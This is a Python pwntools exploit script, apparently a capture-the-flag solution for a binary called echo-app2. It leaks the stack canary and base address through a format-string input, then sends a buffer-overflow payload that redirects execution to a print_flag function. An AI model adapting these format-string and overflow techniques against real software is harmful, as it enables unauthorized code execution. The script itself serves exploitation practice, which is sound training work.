from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b main
breakrva
continue
'''.format(**locals())

exe = './echo-app2'
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ['wt.exe', 'bash', '-c']
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

offset = 264

io = start()

payload = fmtstr_payload(offset=10, writes={
    0x40408c:1
})

fuzz = flat([
    b"%p|"*offset,

])

io.sendline(b"%39$p,%125$p") 

leaks = io.recv().split(b',')
base = int(leaks[1],16) - 0x40
canary = int(leaks[0],16)
elf.address = base

flag = elf.sym["print_flag"]

info(f'canary : %#x',canary)
info(f'base : %#x',elf.address)

payload = flat([
    b"A"*offset,
    p64(canary),
    p64(0x0),
    p64(flag)

])

io.sendline(payload)
io.recvline()

io.interactive()
